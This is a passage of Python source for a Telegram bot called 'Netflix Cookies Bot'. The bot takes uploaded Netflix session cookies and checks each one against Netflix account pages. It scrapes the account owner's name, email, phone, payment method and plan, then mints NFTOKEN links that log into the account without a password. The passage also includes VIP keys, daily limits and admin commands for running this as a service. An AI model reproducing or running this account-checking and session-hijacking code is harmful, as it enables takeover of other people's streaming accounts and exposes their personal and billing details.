    if not extracted.get("videoQuality") or extracted.get("videoQuality") == "UNKNOWN":
        plan_name = extracted.get("localizedPlanName", "")
        if plan_name:
            plan_lower = plan_name.lower()
            if "4k" in plan_lower or "ultra hd" in plan_lower or "premium" in plan_lower:
                extracted["videoQuality"] = "4K Ultra HD"
            elif "hd" in plan_lower or "1080p" in plan_lower or "standard" in plan_lower:
                extracted["videoQuality"] = "1080p HD"
            elif "sd" in plan_lower or "480p" in plan_lower or "basic" in plan_lower:
                extracted["videoQuality"] = "480p SD"
            elif "mobile" in plan_lower:
                extracted["videoQuality"] = "480p (Mobile)"
    
    language = extract_first_match(response_text, [
        r'"preferredLanguage"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"locale"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
        r'"language"\s*:\s*"([^"]+)"',
        r'"locale"\s*:\s*"([^"]+)"'
    ])
    if language:
        extracted['language'] = language.split('-')[0].lower()
    
    extracted.setdefault("membershipStatus", "Unknown")
    extracted.setdefault("localizedPlanName", "Unknown")
    extracted.setdefault("videoQuality", "Not specified")
    extracted.setdefault("nextBillingDate", None)
    extracted.setdefault("paymentMethodType", None)
    
    profiles = extracted.get("profiles")
    extracted["profileCount"] = len([n for n in profiles.split(", ") if n]) if profiles else 0
    extracted["profilesDisplay"] = profiles
    
    if extracted.get("phoneNumber"):
        phone = str(extracted["phoneNumber"])
        digits = re.sub(r'\D', '', phone)
        if len(digits) >= 8:
            extracted["phoneNumber"] = phone
        else:
            extracted["phoneNumber"] = None
            
    return extracted

def normalize_plan_key(plan_name):
    if not plan_name: return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    return re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_") or "unknown"

def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if not cleaned: return None
    try: return int(str(cleaned).strip())
    except:
        match = re.search(r"\d+", str(cleaned))
        return int(match.group(0)) if match else None

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""
    if "premium" in normalized or "高級" in normalized: return "premium", "Premium"
    if "standard" in normalized or "標準" in normalized: return "standard", "Standard"
    if "basic" in normalized or "基本" in normalized: return "basic", "Basic"
    if "mobile" in normalized or "มือถือ" in normalized: return "mobile", "Mobile"

    if streams is not None:
        if streams >= 4 or (raw_quality and "4k" in raw_quality.lower()): return "premium", "Premium"
        if streams >= 2 or (raw_quality and "hd" in raw_quality.lower()): return "standard", "Standard"
        if streams == 1: return "basic", "Basic"

    if raw_plan: return normalize_plan_key(raw_plan), raw_plan
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = decode_netflix_value(info.get("membershipStatus")) or ""
    return "CURRENT_MEMBER" in status.upper() or "ACTIVE" in status.upper()

def derive_output_plan_bucket(info, is_subscribed):
    plan_key, plan_name = derive_plan_info(info, is_subscribed)
    folder_label = plan_name.title() if plan_name else "Unknown"
    return plan_key, folder_label, plan_name or folder_label

def get_account_page(session, request_timeout=20):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    
    urls_to_try = [
        "https://www.netflix.com/account/membership",
        "https://www.netflix.com/account",
        "https://www.netflix.com/YourAccount"
    ]
    
    for url in urls_to_try:
        try:
            response = session.get(url, headers=headers, timeout=request_timeout, allow_redirects=True)
            if response.status_code == 200 and response.text and len(response.text) > 1000:
                info = extract_info(response.text)
                if info.get("countryOfSignup") or info.get("membershipStatus"):
                    return response.text, response.status_code, info
        except Exception:
            continue
    
    return "", 0, None

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id: return None, "Missing cookies"

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    
    for _ in range(attempts):
        try:
            res = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=15, verify=False)
            if res.status_code == 200:
                data = res.json()
                token = decode_netflix_value(data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token"))
                if token: return {"token": token}, None
        except: pass
    return None, "Failed"

# ==========================================
# تنسيق للعرض داخل تليجرام (HTML - من غير روابط نصية)
# ==========================================
def format_for_telegram(info, is_subscribed, nftoken_data=None):
    _, _, plan = derive_output_plan_bucket(info, is_subscribed)
    
    name = decode_netflix_value(info.get('accountOwnerName')) or decode_netflix_value(info.get('name')) or "UNKNOWN"
    email = decode_netflix_value(info.get('email')) or "UNKNOWN"
    country = decode_netflix_value(info.get('countryOfSignup')) or "UNKNOWN"
    language = decode_netflix_value(info.get('language')) or "Not specified"
    member_since = format_member_since(info.get('memberSince'))
    
    expiry_date = format_display_date(info.get('nextBillingDate'))
    if not expiry_date or expiry_date == "UNKNOWN":
        expiry_date = "Not available"
    
    payment = decode_netflix_value(info.get('paymentMethodType'))
    if not payment or payment == "UNKNOWN":
        payment = "Not specified"
    
    video_quality = decode_netflix_value(info.get('videoQuality')) or "Not specified"
    
    phone = decode_netflix_value(info.get('phoneNumber'))
    if not phone or phone == "UNKNOWN":
        phone = "Not provided"
    
    raw_streams = str(decode_netflix_value(info.get('maxStreams')) or "")
    streams_match = re.search(r'\d+', raw_streams)
    streams = streams_match.group(0) if streams_match else "UNKNOWN"
    
    hold_status = decode_netflix_value(info.get('holdStatus')) or "No"
    extra_member = decode_netflix_value(info.get('showExtraMemberSection')) or "No"
    email_verified = decode_netflix_value(info.get('emailVerified')) or "No"
    
    raw_status = decode_netflix_value(info.get('membershipStatus')) or "UNKNOWN"
    hold = decode_netflix_value(info.get('holdStatus')) or "No"

    if "CURRENT_MEMBER" in raw_status.upper():
        if hold == "Yes":
            membership_status = "Hold (Suspended) ⏸️"
        else:
            membership_status = "Active ✅"
    elif "FORMER_MEMBER" in raw_status.upper():
        membership_status = "Expired / Inactive ❌"
    else:
        membership_status = "Active ✅" if is_subscribed else "Inactive"
    
    total_profiles = info.get('profileCount', 0)
    profiles_list = decode_netflix_value(info.get('profilesDisplay')) or "UNKNOWN"

    lines = [
        "--------------------------------------------------",
        f"🎬 <b>{html.escape(plan.upper())} ACCOUNT</b>",
        "--------------------------------------------------",
        "",
        "✅ <b>Status:</b> Valid Paid Account",
        "",
        "📋 <b>Account Details:</b>",
        f"👤 <b>Name:</b> <code>{html.escape(name)}</code>",
        f"📧 <b>Email:</b> <code>{html.escape(email)}</code>",
        f"🌍 <b>Country:</b> {html.escape(country)}",
        f"🌐 <b>Language:</b> {html.escape(language)}",
        f"📦 <b>Plan:</b> {html.escape(plan)}",
        f"🎬 <b>Video Quality:</b> {html.escape(video_quality)}",
        f"📅 <b>Member Since:</b> {html.escape(member_since)}",
        f"⏰ <b>Next Billing:</b> {html.escape(expiry_date)}",
        f"💳 <b>Payment:</b> {html.escape(payment)}",
        f"📱 <b>Phone:</b> {html.escape(phone)}",
        f"💻 <b>Streams:</b> {streams}",
        f"⏸️ <b>Hold:</b> {html.escape(hold_status)}",
        f"👥 <b>Extra Member:</b> {html.escape(extra_member)}",
        f"✅ <b>Email Verified:</b> {html.escape(email_verified)}",
        f"🛡️ <b>Status:</b> {membership_status}",
        "",
        "👥 <b>Profiles:</b>",
        f"📊 <b>Total:</b> {total_profiles}",
        f"📝 <b>List:</b> {html.escape(profiles_list)}",
    ]

    return "\n".join(lines)

# ==========================================
# تنسيق للملفات النصية (Plain Text - مع روابط NFTOKEN)
# ==========================================
def format_for_text_file(info, is_subscribed, nftoken_data=None):
    _, _, plan = derive_output_plan_bucket(info, is_subscribed)
    
    name = decode_netflix_value(info.get('accountOwnerName')) or decode_netflix_value(info.get('name')) or "UNKNOWN"
    email = decode_netflix_value(info.get('email')) or "UNKNOWN"
    country = decode_netflix_value(info.get('countryOfSignup')) or "UNKNOWN"
    language = decode_netflix_value(info.get('language')) or "Not specified"
    member_since = format_member_since(info.get('memberSince'))
    
    expiry_date = format_display_date(info.get('nextBillingDate'))
    if not expiry_date or expiry_date == "UNKNOWN":
        expiry_date = "Not available"
    
    payment = decode_netflix_value(info.get('paymentMethodType'))
    if not payment or payment == "UNKNOWN":
        payment = "Not specified"
    
    video_quality = decode_netflix_value(info.get('videoQuality')) or "Not specified"
    
    phone = decode_netflix_value(info.get('phoneNumber'))
    if not phone or phone == "UNKNOWN":
        phone = "Not provided"
    
    raw_streams = str(decode_netflix_value(info.get('maxStreams')) or "")
    streams_match = re.search(r'\d+', raw_streams)
    streams = streams_match.group(0) if streams_match else "UNKNOWN"
    
    hold_status = decode_netflix_value(info.get('holdStatus')) or "No"
    extra_member = decode_netflix_value(info.get('showExtraMemberSection')) or "No"
    email_verified = decode_netflix_value(info.get('emailVerified')) or "No"
    
    raw_status = decode_netflix_value(info.get('membershipStatus')) or "UNKNOWN"
    hold = decode_netflix_value(info.get('holdStatus')) or "No"

    if "CURRENT_MEMBER" in raw_status.upper():
        if hold == "Yes":
            membership_status = "Hold (Suspended) ⏸️"
        else:
            membership_status = "Active ✅"
    elif "FORMER_MEMBER" in raw_status.upper():
        membership_status = "Expired / Inactive ❌"
    else:
        membership_status = "Active ✅" if is_subscribed else "Inactive"
    
    total_profiles = info.get('profileCount', 0)
    profiles_list = decode_netflix_value(info.get('profilesDisplay')) or "UNKNOWN"

    lines = [
        "--------------------------------------------------",
        f"🎬 {plan.upper()} ACCOUNT",
        "--------------------------------------------------",
        "",
        "✅ Status: Valid Paid Account",
        "",
        "📋 Account Details:",
        f"👤 Name: {name}",
        f"📧 Email: {email}",
        f"🌍 Country: {country}",
        f"🌐 Language: {language}",
        f"📦 Plan: {plan}",
        f"🎬 Video Quality: {video_quality}",
        f"📅 Member Since: {member_since}",
        f"⏰ Next Billing: {expiry_date}",
        f"💳 Payment: {payment}",
        f"📱 Phone: {phone}",
        f"💻 Streams: {streams}",
        f"⏸️ Hold: {hold_status}",
        f"👥 Extra Member: {extra_member}",
        f"✅ Email Verified: {email_verified}",
        f"🛡️ Status: {membership_status}",
        "",
        "👥 Profiles:",
        f"📊 Total: {total_profiles}",
        f"📝 List: {profiles_list}",
    ]

    if nftoken_data and nftoken_data.get('token'):
        token = nftoken_data['token']
        lines.extend([
            "",
            "--------------------------------------------------",
            "🔑 NFTOKEN LOGIN LINKS",
            "--------------------------------------------------",
            "💻 PC Login:",
            f"https://netflix.com/login?nftoken={token}",
            "",
            "📱 Phone Login:",
            f"https://netflix.com/unsupported?nftoken={token}"
        ])

    return "\n".join(lines)


# ==========================================
# Telegram Bot Logic
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)
active_tasks = {}

def setup_bot_commands():
    bot.set_my_commands([
        BotCommand("start", "🏠 Show menu"),
        BotCommand("help", "❓ Instructions"),
        BotCommand("stats", "📊 Statistics"),
        BotCommand("limit", "📅 Remaining checks today"),
        BotCommand("myid", "🆔 Get your user ID"),
        BotCommand("myadmin", "⭐ Check your admin status"),
        BotCommand("redeem", "🎫 Redeem a key for VIP access"),
        BotCommand("genkey", "🔑 Generate new key (Owner only)"),
        BotCommand("keys", "📋 List active keys (Owner only)"),
        BotCommand("delkey", "🗑️ Delete a key (Owner only)"),
        BotCommand("addadmin", "👑 Add admin (Owner only)"),
        BotCommand("deladmin", "🗑️ Remove admin (Owner only)"),
        BotCommand("listadmins", "📋 List all admins (Owner only)"),
        BotCommand("broadcast", "📢 Send message to all users (Owner only)"),
        BotCommand("cancel", "🛑 Stop task")
    ])

# ==========================================
# أزرار تفاعلية للنتائج (بدون زر Copy Text)
# ==========================================
def create_result_buttons(nftoken_data=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    if nftoken_data and nftoken_data.get('token'):
        token = nftoken_data['token']
        pc_btn = InlineKeyboardButton("💻 PC Login", url=f"https://netflix.com/login?nftoken={token}")
        phone_btn = InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}")
        keyboard.add(pc_btn, phone_btn)
    
    return keyboard

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    pass

# ==========================================
# شريط التقدم - الشكل الأزرق
# ==========================================
def generate_progress_bar(current, total, length=20):
    if total == 0: 
        return f"[{'▒' * length}] 0.0%"
    percent = current / total
    filled = int(length * percent)
    return f"[{'█' * filled}{'▒' * (length - filled)}] {percent * 100:.1f}%"

def build_status_message(stats, total, start_time):
    processed = stats['processed']
    elapsed = time.time() - start_time
    speed = processed / elapsed if elapsed > 0 else 0
    remaining = total - processed
    eta = remaining / speed if speed > 0 else 0

    return (
        f"⚡ <b>Processing Progress</b>\n\n"
        f"<b>Total Cookies:</b> {total}\n"
        f"<b>Mode:</b> Fullinfo (No Proxies)\n"
        f"<b>Filter:</b> All accounts\n\n"
        f"<b>Current Status:</b>\n"
        f"<code>{generate_progress_bar(processed, total)}</code>\n"
        f"🔍 <b>Processing:</b> {processed}/{total}\n"
        f"✅ <b>Valid:</b> {stats['valid']}\n"
        f"👑 <b>Premium:</b> {stats['premium']}\n"
        f"🍿 <b>Standard:</b> {stats['standard']}\n"
        f"📱 <b>Basic/Mobile:</b> {stats['basic']}\n"
        f"🆓 <b>Free:</b> {stats['free']}\n"
        f"❌ <b>Invalid:</b> {stats['invalid']}\n\n"
        f"<b>Speed:</b> {speed:.1f} acc/s\n"
        f"<b>ETA:</b> {eta:.1f}s remaining\n\n"
        f"⚠️ Use /cancel to stop this task"
    )

# ==========================================
# Broadcast System (Owner only)
# ==========================================
def confirm_broadcast(message: Message, broadcast_text):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    if message.text.upper() == "YES":
        bot.reply_to(message, f"📤 Sending broadcast to <b>{len(known_users)}</b> users...", parse_mode="HTML")
        
        success_count = 0
        fail_count = 0
        
        for uid in known_users:
            try:
                bot.send_message(uid, f"📢 <b>Announcement from Bot Owner</b>\n\n{broadcast_text}", parse_mode="HTML")
                success_count += 1
                time.sleep(0.05)
            except Exception:
                fail_count += 1
        
        bot.reply_to(message, f"✅ Broadcast Completed!\n\n📨 Sent: <b>{success_count}</b>\n❌ Failed: <b>{fail_count}</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Broadcast cancelled.", parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can use this command.", parse_mode="HTML")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage:\n\n<code>/broadcast &lt;message&gt;</code>\n\nExample:\n<code>/broadcast Hello everyone! The bot will be down for 1 hour.</code>", parse_mode="HTML")
        return
    
    broadcast_text = parts[1]
    
    if not known_users:
        bot.reply_to(message, "⚠️ No users have interacted with the bot yet.", parse_mode="HTML")
        return
    
    confirm_msg = bot.reply_to(message, f"⚠️ Are you sure you want to send this message to <b>{len(known_users)}</b> users?\n\nMessage:\n<code>{broadcast_text[:200]}</code>\n\nReply with <b>YES</b> to confirm, or <b>NO</b> to cancel.", parse_mode="HTML")
    
    bot.register_next_step_handler(confirm_msg, confirm_broadcast, broadcast_text)

# ==========================================
# أوامر المشرفين (للمطور الرئيسي فقط)
# ==========================================
@bot.message_handler(commands=['addadmin'])
def add_admin(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can use this command.", parse_mode="HTML")
        return
    
    global ADMIN_USER_IDS, ADMIN_USERNAMES
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, f"❌ Usage:\n\n<code>/addadmin &lt;user_id&gt; or @username</code>\n\nExample:\n<code>/addadmin 123456789</code>\n<code>/addadmin @EyadZaen</code>", parse_mode="HTML")
            return
        
        target = command_parts[1]
        
        if target.startswith('@'):
            username = target[1:]
            if username not in ADMIN_USERNAMES:
                ADMIN_USERNAMES.append(username)
                bot.reply_to(message, f"✅ Admin Added!\n\nUsername <code>@{username}</code> has been granted unlimited checks.", parse_mode="HTML")
            else:
                bot.reply_to(message, f"⚠️ <code>@{username}</code> is already an admin.", parse_mode="HTML")
        else:
            try:
                new_admin_id = int(target)
                if new_admin_id not in ADMIN_USER_IDS:
                    ADMIN_USER_IDS.append(new_admin_id)
                    bot.reply_to(message, f"✅ Admin Added!\n\nUser ID <code>{new_admin_id}</code> has been granted unlimited checks.", parse_mode="HTML")
                else:
                    bot.reply_to(message, f"⚠️ User ID <code>{new_admin_id}</code> is already an admin.", parse_mode="HTML")
            except ValueError:
                bot.reply_to(message, f"❌ Invalid input! Please provide a valid user ID or username starting with @.", parse_mode="HTML")
                
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=['deladmin'])
def del_admin(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can use this command.", parse_mode="HTML")
        return
    
    global ADMIN_USER_IDS, ADMIN_USERNAMES
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, f"❌ Usage:\n\n<code>/deladmin &lt;user_id&gt; or @username</code>\n\nExample:\n<code>/deladmin 123456789</code>\n<code>/deladmin @EyadZaen</code>", parse_mode="HTML")
            return
        
        target = command_parts[1]
        
        if target.startswith('@'):
            username = target[1:]
            if username in ADMIN_USERNAMES:
                ADMIN_USERNAMES.remove(username)
                bot.reply_to(message, f"✅ Admin Removed!\n\nUsername <code>@{username}</code> has been removed from admins.", parse_mode="HTML")
            else:
                bot.reply_to(message, f"⚠️ <code>@{username}</code> is not an admin.", parse_mode="HTML")
        else:
            try:
                admin_id = int(target)
                if admin_id in ADMIN_USER_IDS:
                    ADMIN_USER_IDS.remove(admin_id)
                    bot.reply_to(message, f"✅ Admin Removed!\n\nUser ID <code>{admin_id}</code> has been removed from admins.", parse_mode="HTML")
                else:
                    bot.reply_to(message, f"⚠️ User ID <code>{admin_id}</code> is not an admin.", parse_mode="HTML")
            except ValueError:
                bot.reply_to(message, f"❌ Invalid input! Please provide a valid user ID or username starting with @.", parse_mode="HTML")
                
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=['listadmins'])
def list_admins(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can use this command.", parse_mode="HTML")
        return
    
    admin_list = "👑 Current Admins (Unlimited Checks)\n\n"
    
    if ADMIN_USER_IDS:
        admin_list += "📌 By User ID:\n"
        for aid in ADMIN_USER_IDS:
            admin_list += f"   • <code>{aid}</code>\n"
    
    if ADMIN_USERNAMES:
        admin_list += "\n📌 By Username:\n"
        for uname in ADMIN_USERNAMES:
            admin_list += f"   • @{uname}\n"
    
    if not ADMIN_USER_IDS and not ADMIN_USERNAMES:
        admin_list += "   No admins added yet.\n"
    
    admin_list += "\n💡 Note: Owner always has unlimited access by default.\n\n🔑 VIP keys can be generated with /genkey"
    
    bot.reply_to(message, admin_list, parse_mode="HTML")

# ==========================================
# VIP Key System Commands
# ==========================================
@bot.message_handler(commands=['genkey'])
def generate_new_key(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can generate keys.", parse_mode="HTML")
        return
    
    new_key = generate_key()
    expiry_time = time.time() + (6 * 3600)
    active_keys[new_key] = expiry_time
    
    expiry_date = datetime.fromtimestamp(expiry_time).strftime("%Y-%m-%d %H:%M:%S")
    
    bot.reply_to(message, f"🔑 NEW KEY GENERATED\n\n"
                 f"📌 Key: <code>{new_key}</code>\n"
                 f"⏰ Valid: 6 hours\n"
                 f"📅 Expires: <code>{expiry_date}</code>\n\n"
                 f"📤 Share this key with user:\n<code>/redeem {new_key}</code>", parse_mode="HTML")

@bot.message_handler(commands=['keys'])
def list_keys(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can view active keys.", parse_mode="HTML")
        return
    
    if not active_keys:
        bot.reply_to(message, "📭 No Active Keys\n\nThere are no active keys at the moment.\n\nUse /genkey to generate a new key.", parse_mode="HTML")
        return
    
    keys_list = "🔑 Active Keys\n\n"
    for key, expiry in active_keys.items():
        remaining = expiry - time.time()
        remaining_hours = int(remaining // 3600)
        remaining_minutes = int((remaining % 3600) // 60)
        keys_list += f"📌 <code>{key}</code>\n   ⏰ Expires in: {remaining_hours}h {remaining_minutes}m\n\n"
    
    keys_list += f"\n📊 Total: {len(active_keys)} active key(s)"
    
    bot.reply_to(message, keys_list, parse_mode="HTML")

@bot.message_handler(commands=['delkey'])
def delete_key(message: Message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Access Denied!\n\nOnly the bot owner can delete keys.", parse_mode="HTML")
        return
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, f"❌ Usage:\n\n<code>/delkey &lt;key&gt;</code>\n\nExample: <code>/delkey X7K9-M3P2</code>\n\n💡 Use /keys to see all active keys.", parse_mode="HTML")
            return
        
        key = command_parts[1].upper()
        
        if key not in active_keys:
            bot.reply_to(message, f"❌ Key not found!\n\nKey <code>{key}</code> is not active or has already expired.\n\n💡 Use /keys to see all active keys.", parse_mode="HTML")
            return
        
        del active_keys[key]
        
        bot.reply_to(message, f"✅ Key Deleted!\n\n🔑 Key: <code>{key}</code>\n\nThis key can no longer be used by anyone.", parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def redeem_key(message: Message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "❌ Usage:\n\n<code>/redeem &lt;key&gt;</code>\n\nExample: <code>/redeem X7K9-M3P2</code>", parse_mode="HTML")
            return
        
        key = command_parts[1].upper()
        
        if key not in active_keys:
            bot.reply_to(message, "❌ INVALID KEY\n\nThe key you entered is not valid or has expired.", parse_mode="HTML")
            return
        
        if time.time() > active_keys[key]:
            del active_keys[key]
            bot.reply_to(message, "⏰ KEY EXPIRED\n\nThis key has expired and is no longer valid.\n\n💡 Contact the bot owner for a new key.", parse_mode="HTML")
            return
        
        expiry_time = active_keys[key]
        temp_admins[user_id] = expiry_time
        
        del active_keys[key]
        
        expiry_date = datetime.fromtimestamp(expiry_time).strftime("%Y-%m-%d %H:%M:%S")
        remaining_hours = int((expiry_time - time.time()) // 3600)
        remaining_minutes = int(((expiry_time - time.time()) % 3600) // 60)
        
        bot.reply_to(message, f"🎉 VIP ACTIVATED 🎉\n\n"
                     f"🔑 Key: <code>{key}</code>\n"
                     f"⏰ VIP Duration: 6 hours\n"
                     f"📅 Expires: <code>{expiry_date}</code>\n"
                     f"⏳ Remaining: {remaining_hours}h {remaining_minutes}m\n\n"
                     f"✨ You now have UNLIMITED checks!\n\n"
                     f"💡 Use /myadmin to check VIP status", parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=['myadmin'])
def my_admin_status(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    if is_owner(user_id):
        status = "👑 Owner (Permanent)\n✨ Unlimited access"
    elif user_id in ADMIN_USER_IDS or (username and username in ADMIN_USERNAMES):
        status = "👑 Permanent Admin\n✨ Unlimited access"
    elif is_temp_admin(user_id):
        expiry = temp_admins[user_id]
        remaining = expiry - time.time()
        remaining_hours = int(remaining // 3600)
        remaining_minutes = int((remaining % 3600) // 60)
        status = f"⭐ VIP Member (Temporary)\n⏰ Expires in: {remaining_hours}h {remaining_minutes}m\n✨ Unlimited access active"
    else:
        remaining = get_remaining_checks(user_id, username)
        status = f"👤 Regular User\n🔢 Daily limit: {MAX_CHECKS_PER_DAY}\n📅 Remaining today: {remaining}\n\n💡 Use /redeem <key> for VIP access"
    
    bot.reply_to(message, f"📊 YOUR ADMIN STATUS\n\n{status}", parse_mode="HTML")

# ==========================================
# أمر مؤقت لمعرفة معرف المستخدم
# ==========================================
@bot.message_handler(commands=['myid'])
def show_my_id(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    bot.reply_to(message, f"🆔 Your ID: <code>{user_id}</code>\n👤 Username: @{username if username else 'None'}", parse_mode="HTML")

# ==========================================
# رسالة الترحيب (لـ /start)
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(message: Message):
    user_name = message.from_user.first_name or message.from_user.username or "User"
    user_id = message.from_user.id
    username = message.from_user.username
    
    # تسجيل المستخدم للـ broadcast
    known_users.add(user_id)
    
    if is_admin(user_id, username):
        limit_text = "Unlimited ♾️"
        admin_badge = " 👑 (Admin)"
    else:
        limit_text = f"{MAX_CHECKS_PER_DAY} per day"
        admin_badge = ""
    
    welcome_text = f"""
🎬 Netflix Cookies Bot 🍿

✨ Welcome {html.escape(user_name)}!{admin_badge}

👨‍💻 Dev: Eyad Zaen

📊 Your Daily Limit: {limit_text}

📌 How to use the bot:

1️⃣ Send a .txt, .json, or .zip file 
2️⃣ Or paste cookies directly in the chat
3️⃣ The bot will automatically extract Accounts
4️⃣ Get detailed information about each Account

📋 Bot Commands:

/start - 🏠 Show this menu
/help - ❓ Get help & instructions  
/stats - 📊 View bot statistics
/limit - 📅 Remaining checks today
/myid - 🆔 Get your user ID
/myadmin - ⭐ Check your admin status
/redeem - 🎫 Redeem a key for VIP access
/genkey - 🔑 Generate new key (Owner only)
/keys - 📋 List active keys (Owner only)
/delkey - 🗑️ Delete a key (Owner only)
/addadmin - 👑 Add admin (Owner only)
/deladmin - 🗑️ Remove admin (Owner only)
/listadmins - 📋 List all admins (Owner only)
/broadcast - 📢 Send message to all users (Owner only)
/cancel - 🛑 Stop current task

⚡ Features:

✅ Fast processing (No proxies needed)
✅ Pure in-memory (No files saved)
✅ Supports multiple formats (TXT/JSON/ZIP)
✅ Automatic cookie extraction
✅ Detailed account information
✅ NFTOKEN generation for PC & Phone login
✅ VIP system for temporary unlimited access

📤 Just send me a file or paste cookies ✨

💡 Tip: Made By Eyad
"""
    bot.reply_to(message, welcome_text, parse_mode="HTML")

# ==========================================
# رسالة المساعدة (لـ /help)
# ==========================================
@bot.message_handler(commands=['help'])
def send_help(message: Message):
    help_text = """
❓ Netflix Cookies Bot - Help Guide

📌 How to use the bot:

Method 1 - Upload file:
Send a .txt, .json, or .zip file containing Netflix cookies

Method 2 - Paste text:
Copy your cookies and paste them directly in the chat

📋 Available Commands:

/start - 🏠 Show welcome message
/help - ❓ Show this help guide
/stats - 📊 View bot statistics
/limit - 📅 Remaining checks today
/myid - 🆔 Get your user ID
/myadmin - ⭐ Check your admin status
/redeem - 🎫 Redeem a key for VIP access
/genkey - 🔑 Generate new key (Owner only)
/keys - 📋 List active keys (Owner only)
/delkey - 🗑️ Delete a key (Owner only)
/addadmin - 👑 Add admin (Owner only)
/deladmin - 🗑️ Remove admin (Owner only)
/listadmins - 📋 List all admins (Owner only)
/broadcast - 📢 Send message to all users (Owner only)
/cancel - 🛑 Stop current task

📁 What you'll get:

• Account details (Name, Email, Country, Language)
• Plan type (Premium/Standard/Basic/Mobile)
• Video quality (4K/HD/SD)
• Membership status & expiry date
• NFTOKEN login links for PC & Phone
• Profiles list & more!

💡 Tips:

• Make sure your cookies are valid and not expired
• Use /cancel if you want to stop a running task
• Results are exported as .txt files (for file upload) or as interactive messages (for text paste)
• Use /redeem with a valid key to get VIP access (6 hours unlimited checks)

👨‍💻 Developer: Eyad Zaen

🔧 Bot Status: Online & Ready!
"""
    bot.reply_to(message, help_text, parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def show_stats(message: Message):
    user = message.from_user
    user_id = user.id
    username = user.username
    remaining = get_remaining_checks(user_id, username)
    
    if is_admin(user_id, username):
        admin_tag = " 👑 (Admin - Unlimited)"
    else:
        admin_tag = ""
    
    stats_text = f"""
📊 Bot Statistics{admin_tag}

📅 Your Daily Limit:
• Maximum checks per day: {MAX_CHECKS_PER_DAY if not is_admin(user_id, username) else 'Unlimited ♾️'}
• Remaining today: {remaining}

⚡ Bot Status:
• Running entirely in-memory
• No proxies needed
• Ready to process files

📤 Send a file or paste cookies to get started!
"""
    bot.reply_to(message, stats_text, parse_mode="HTML")

@bot.message_handler(commands=['limit'])
def show_limit(message: Message):
    user = message.from_user
    user_id = user.id
    username = user.username
    remaining = get_remaining_checks(user_id, username)
    
    if is_admin(user_id, username):
        limit_text = f"""
👑 Admin Access

✅ You have UNLIMITED checks!
♾️ No daily restrictions apply.

💡 Use /stats for more information
"""
    else:
        used = MAX_CHECKS_PER_DAY - (remaining if isinstance(remaining, int) else MAX_CHECKS_PER_DAY)
        limit_text = f"""
📊 Your Daily Usage

✅ Used today: {used}
📅 Remaining today: {remaining}
